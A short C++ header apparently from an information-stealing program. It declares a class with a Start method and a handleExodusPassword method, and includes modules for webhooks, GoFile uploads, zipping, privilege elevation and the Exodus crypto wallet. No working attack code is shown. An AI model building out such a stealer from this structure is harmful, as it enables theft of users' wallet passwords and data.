#pragma once
#include <utils/Utils.h>
#include <webhook/Webhook.h>
#include <upload/GoFileUpload.h>
#include <upload/ZipFile.h>
#include <elevation/Elevation.h>
#include <features/exodus/Exodus.h>

namespace gritz
{
	class cGritz final
	{
	private:

	public:
		static void Start(char** args);
		static void handleExodusPassword();
	};
}